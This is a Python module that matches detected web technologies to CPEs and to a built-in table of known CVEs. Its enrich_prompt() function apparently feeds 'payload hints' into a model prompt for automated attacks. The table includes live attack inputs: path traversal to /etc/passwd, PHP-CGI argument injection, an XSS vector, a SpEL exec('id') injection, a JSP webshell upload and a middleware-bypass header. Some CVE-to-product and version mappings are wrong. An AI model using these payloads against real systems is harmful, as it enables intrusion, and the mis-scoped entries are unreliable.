"""Map detected technologies to CPE identifiers and known CVEs."""
from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

from packaging.version import InvalidVersion, Version

log = logging.getLogger(__name__)

TECH_TO_CPE: Dict[str, str] = {
    "apache": "cpe:2.3:a:apache:http_server:",
    "nginx": "cpe:2.3:a:f5:nginx:",
    "php": "cpe:2.3:a:php:php:",
    "wordpress": "cpe:2.3:a:wordpress:wordpress:",
    "django": "cpe:2.3:a:djangoproject:django:",
    "laravel": "cpe:2.3:a:laravel:laravel:",
    "jquery": "cpe:2.3:a:jquery:jquery:",
    "tomcat": "cpe:2.3:a:apache:tomcat:",
    "spring": "cpe:2.3:a:vmware:spring_framework:",
    "express": "cpe:2.3:a:expressjs:express:",
    "express.js": "cpe:2.3:a:expressjs:express:",
    "flask": "cpe:2.3:a:palletsprojects:flask:",
    "ruby on rails": "cpe:2.3:a:rubyonrails:rails:",
    "rails": "cpe:2.3:a:rubyonrails:rails:",
    "joomla": "cpe:2.3:a:joomla:joomla\\!:",
    "drupal": "cpe:2.3:a:drupal:drupal:",
    "next.js": "cpe:2.3:a:vercel:next.js:",
    "microsoft iis": "cpe:2.3:a:microsoft:internet_information_services:",
    "asp.net": "cpe:2.3:a:microsoft:asp.net:",
    "openresty": "cpe:2.3:a:openresty:openresty:",
    "phpmyadmin": "cpe:2.3:a:phpmyadmin:phpmyadmin:",
    "angularjs": "cpe:2.3:a:angularjs:angular.js:",
    "vue.js": "cpe:2.3:a:vuejs:vue.js:",
    "react": "cpe:2.3:a:facebook:react:",
    "bootstrap": "cpe:2.3:a:getbootstrap:bootstrap:",
}


KNOWN_CVES: List[Dict] = [
    # ── Apache ────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2021-41773",
        "cpe_prefix": "cpe:2.3:a:apache:http_server:",
        "affected_versions": {"start": "2.4.49", "end": "2.4.49"},
        "severity": "CRITICAL",
        "description": "Path traversal and RCE in Apache 2.4.49",
        "exploit_type": "lfi",
        "payload": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
    },
    {
        "cve_id": "CVE-2021-42013",
        "cpe_prefix": "cpe:2.3:a:apache:http_server:",
        "affected_versions": {"start": "2.4.49", "end": "2.4.50"},
        "severity": "CRITICAL",
        "description": "Incomplete fix for CVE-2021-41773 path traversal in Apache 2.4.50",
        "exploit_type": "lfi",
        "payload": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
    },
    # ── Nginx ─────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2021-23017",
        "cpe_prefix": "cpe:2.3:a:f5:nginx:",
        "affected_versions": {"start": "0.6.18", "end": "1.20.0"},
        "severity": "HIGH",
        "description": "Off-by-one in DNS resolver allows network-based attackers to cause 1-byte memory overwrite",
        "exploit_type": "memory_corruption",
        "payload": "Crafted DNS response",
    },
    # ── PHP ───────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2024-4577",
        "cpe_prefix": "cpe:2.3:a:php:php:",
        "affected_versions": {"start": "8.1.0", "end": "8.1.29"},
        "severity": "CRITICAL",
        "description": "PHP CGI argument injection on Windows allows RCE",
        "exploit_type": "cmdi",
        "payload": "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input",
    },
    {
        "cve_id": "CVE-2012-1823",
        "cpe_prefix": "cpe:2.3:a:php:php:",
        "affected_versions": {"start": "5.3.0", "end": "5.3.12"},
        "severity": "CRITICAL",
        "description": "PHP CGI query string parameter injection allows code execution",
        "exploit_type": "cmdi",
        "payload": "?-d+allow_url_include=1+-d+auto_prepend_file=php://input",
    },
    # ── WordPress ─────────────────────────────────────────────────
    {
        "cve_id": "CVE-2022-21661",
        "cpe_prefix": "cpe:2.3:a:wordpress:wordpress:",
        "affected_versions": {"start": "3.7.0", "end": "5.8.2"},
        "severity": "HIGH",
        "description": "WordPress WP_Query SQL injection via crafted query variable",
        "exploit_type": "sqli",
        "payload": "Crafted WP_Query tax_query parameter",
    },
    {
        "cve_id": "CVE-2023-2982",
        "cpe_prefix": "cpe:2.3:a:wordpress:wordpress:",
        "affected_versions": {"start": "5.0.0", "end": "6.2.2"},
        "severity": "HIGH",
        "description": "WordPress authentication bypass via miniOrange Social Login plugin",
        "exploit_type": "auth_bypass",
        "payload": "Modified OAuth callback with forged authentication token",
    },
    # ── Django ────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2022-34265",
        "cpe_prefix": "cpe:2.3:a:djangoproject:django:",
        "affected_versions": {"start": "3.2.0", "end": "3.2.14"},
        "severity": "CRITICAL",
        "description": "Potential SQL injection via Trunc/Extract with crafted kind/lookup_name",
        "exploit_type": "sqli",
        "payload": "Crafted Trunc(kind=...) or Extract(lookup_name=...) argument",
    },
    {
        "cve_id": "CVE-2023-36053",
        "cpe_prefix": "cpe:2.3:a:djangoproject:django:",
        "affected_versions": {"start": "3.2.0", "end": "3.2.20"},
        "severity": "HIGH",
        "description": "ReDoS in EmailValidator/URLValidator via huge input",
        "exploit_type": "dos",
        "payload": "Extremely long email/URL input triggering catastrophic backtracking",
    },
    # ── Laravel ───────────────────────────────────────────────────
    {
        "cve_id": "CVE-2021-3129",
        "cpe_prefix": "cpe:2.3:a:laravel:laravel:",
        "affected_versions": {"start": "5.0.0", "end": "8.4.2"},
        "severity": "CRITICAL",
        "description": "Ignition RCE via file write through _ignition/execute-solution endpoint",
        "exploit_type": "rce",
        "payload": "POST /_ignition/execute-solution with viewFile chain for phar deserialization",
    },
    # ── jQuery ────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2020-11022",
        "cpe_prefix": "cpe:2.3:a:jquery:jquery:",
        "affected_versions": {"start": "1.2.0", "end": "3.4.1"},
        "severity": "MEDIUM",
        "description": "XSS in jQuery via passing HTML containing <option> elements to DOM manipulation methods",
        "exploit_type": "xss",
        "payload": "<option><style></option></select><img src=x onerror=alert(1)>",
    },
    {
        "cve_id": "CVE-2019-11358",
        "cpe_prefix": "cpe:2.3:a:jquery:jquery:",
        "affected_versions": {"start": "1.0.0", "end": "3.3.1"},
        "severity": "MEDIUM",
        "description": "Prototype pollution in jQuery.extend with deep=true",
        "exploit_type": "prototype_pollution",
        "payload": "$.extend(true, {}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'))",
    },
    # ── Tomcat ────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2020-1938",
        "cpe_prefix": "cpe:2.3:a:apache:tomcat:",
        "affected_versions": {"start": "6.0.0", "end": "9.0.30"},
        "severity": "CRITICAL",
        "description": "Ghostcat: AJP connector file read/include leading to RCE",
        "exploit_type": "lfi",
        "payload": "AJP request to port 8009 with javax.servlet.include.request_uri attribute",
    },
    {
        "cve_id": "CVE-2017-12617",
        "cpe_prefix": "cpe:2.3:a:apache:tomcat:",
        "affected_versions": {"start": "7.0.0", "end": "7.0.81"},
        "severity": "HIGH",
        "description": "Tomcat JSP upload via HTTP PUT when readonly init param is false",
        "exploit_type": "rce",
        "payload": "PUT /shell.jsp/ HTTP/1.1 with JSP webshell body",
    },
    # ── Spring Framework ──────────────────────────────────────────
    {
        "cve_id": "CVE-2022-22965",
        "cpe_prefix": "cpe:2.3:a:vmware:spring_framework:",
        "affected_versions": {"start": "5.3.0", "end": "5.3.17"},
        "severity": "CRITICAL",
        "description": "Spring4Shell: RCE via data binding on JDK 9+ with Tomcat",
        "exploit_type": "rce",
        "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{...}",
    },
    {
        "cve_id": "CVE-2022-22963",
        "cpe_prefix": "cpe:2.3:a:vmware:spring_framework:",
        "affected_versions": {"start": "3.0.0", "end": "3.2.2"},
        "severity": "CRITICAL",
        "description": "Spring Cloud Function SpEL injection RCE",
        "exploit_type": "rce",
        "payload": "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')",
    },
    # ── Express.js ────────────────────────────────────────────────
    {
        "cve_id": "CVE-2024-29041",
        "cpe_prefix": "cpe:2.3:a:expressjs:express:",
        "affected_versions": {"start": "4.0.0", "end": "4.19.1"},
        "severity": "MEDIUM",
        "description": "Open redirect via maliciously crafted URL in res.redirect()",
        "exploit_type": "open_redirect",
        "payload": "res.redirect('//attacker.com') with backslash-prefixed URL",
    },
    # ── Flask ─────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2023-30861",
        "cpe_prefix": "cpe:2.3:a:palletsprojects:flask:",
        "affected_versions": {"start": "2.3.0", "end": "2.3.1"},
        "severity": "HIGH",
        "description": "Session cookie set without Vary: Cookie header allows caching proxy leak",
        "exploit_type": "session_leak",
        "payload": "Cacheable response with Set-Cookie leaks session via CDN/proxy",
    },
    # ── Drupal ────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2018-7600",
        "cpe_prefix": "cpe:2.3:a:drupal:drupal:",
        "affected_versions": {"start": "7.0", "end": "7.57"},
        "severity": "CRITICAL",
        "description": "Drupalgeddon 2: RCE via AJAX API form rendering",
        "exploit_type": "rce",
        "payload": "POST /user/register with mail[#markup] and #post_render callback",
    },
    # ── Joomla ────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2023-23752",
        "cpe_prefix": "cpe:2.3:a:joomla:joomla\\!:",
        "affected_versions": {"start": "4.0.0", "end": "4.2.7"},
        "severity": "HIGH",
        "description": "Joomla unauthorized API access leaking database credentials",
        "exploit_type": "info_disclosure",
        "payload": "GET /api/index.php/v1/config/application?public=true",
    },
    # ── phpMyAdmin ────────────────────────────────────────────────
    {
        "cve_id": "CVE-2020-26935",
        "cpe_prefix": "cpe:2.3:a:phpmyadmin:phpmyadmin:",
        "affected_versions": {"start": "4.0.0", "end": "4.9.6"},
        "severity": "HIGH",
        "description": "SQL injection in phpMyAdmin search feature",
        "exploit_type": "sqli",
        "payload": "Crafted database/table name in search functionality",
    },
    # ── Next.js ───────────────────────────────────────────────────
    {
        "cve_id": "CVE-2025-29927",
        "cpe_prefix": "cpe:2.3:a:vercel:next.js:",
        "affected_versions": {"start": "11.0.0", "end": "14.2.24"},
        "severity": "CRITICAL",
        "description": "Next.js middleware bypass via x-middleware-subrequest header",
        "exploit_type": "auth_bypass",
        "payload": "x-middleware-subrequest: middleware:middleware:middleware",
    },
]


def _parse_version(v: str) -> Optional[Version]:
    try:
        return Version(v)
    except InvalidVersion:
        return None


@dataclass
class CVEMatch:
    cve_id: str
    technology: str
    severity: str
    description: str
    exploit_type: str
    payload: str
    version_match: bool = False


class CPEMatcher:
    """Match detected technologies (with optional versions) against known CVEs."""

    def match(self, technologies: List[str]) -> List[CVEMatch]:
        results: List[CVEMatch] = []
        for tech_raw in technologies:
            tech_lower = tech_raw.lower().strip()
            tech_name, version_str = self._split_version(tech_lower)

            cpe_prefix = self._resolve_cpe(tech_name)
            if not cpe_prefix:
                continue

            for cve in KNOWN_CVES:
                if cve["cpe_prefix"] != cpe_prefix:
                    continue
                ver_match = self._version_in_range(
                    version_str,
                    cve["affected_versions"]["start"],
                    cve["affected_versions"]["end"],
                )
                results.append(
                    CVEMatch(
                        cve_id=cve["cve_id"],
                        technology=tech_raw,
                        severity=cve["severity"],
                        description=cve["description"],
                        exploit_type=cve["exploit_type"],
                        payload=cve["payload"],
                        version_match=ver_match,
                    )
                )
        seen: set[str] = set()
        deduped: List[CVEMatch] = []
        for m in results:
            if m.cve_id not in seen:
                seen.add(m.cve_id)
                deduped.append(m)
        deduped.sort(key=lambda m: (m.version_match, m.severity == "CRITICAL"), reverse=True)
        return deduped

    def enrich_prompt(self, technologies: List[str], max_tokens: int = 600) -> str:
        matches = self.match(technologies)
        if not matches:
            return ""
        lines = ["### CVE Intelligence for Detected Stack"]
        budget = max_tokens
        for m in matches:
            tag = "VERSION-MATCH" if m.version_match else "possible"
            block = (
                f"- **{m.cve_id}** [{m.severity}] ({tag}) — {m.description}\n"
                f"  Exploit: {m.exploit_type} | Payload hint: `{m.payload[:120]}`\n"
            )
            budget -= len(block)
            if budget < 0:
                break
            lines.append(block)
        return "\n".join(lines)

    @staticmethod
    def _split_version(tech: str) -> Tuple[str, str]:
        parts = tech.rsplit(" ", 1)
        if len(parts) == 2 and _parse_version(parts[1]) is not None:
            return parts[0], parts[1]
        return tech, ""

    @staticmethod
    def _resolve_cpe(tech_name: str) -> str:
        if tech_name in TECH_TO_CPE:
            return TECH_TO_CPE[tech_name]
        for key, cpe in TECH_TO_CPE.items():
            if key in tech_name or tech_name in key:
                return cpe
        return ""

    @staticmethod
    def _version_in_range(detected: str, start: str, end: str) -> bool:
        if not detected:
            return False
        v = _parse_version(detected)
        vs = _parse_version(start)
        ve = _parse_version(end)
        if v is None or vs is None or ve is None:
            return False
        return vs <= v <= ve
